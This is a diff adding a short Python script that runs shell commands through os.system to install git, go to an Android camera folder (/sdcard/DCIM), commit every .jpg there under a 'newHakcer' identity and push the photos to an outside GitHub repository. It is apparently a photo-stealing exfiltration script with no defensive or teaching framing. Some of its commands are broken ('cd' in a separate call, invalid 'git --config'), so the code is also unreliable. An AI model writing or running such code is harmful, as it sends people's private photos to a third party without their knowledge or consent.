@@ -1,0 +1,10 @@
+from os import system 
+system('apt install git')
+system('cd /sdcard/DCIM')
+system('git init')
+system("git --config user.name 'newHakcer'")
+system("git --config user.email 'hacker@hacker.com' ")
+system('git add *.jpg   ')
+system("git commit -m 'init'")
+system('git remote add origin  https://github.com/ghh35181/ghaemdata.git')
+system('git push origin master')
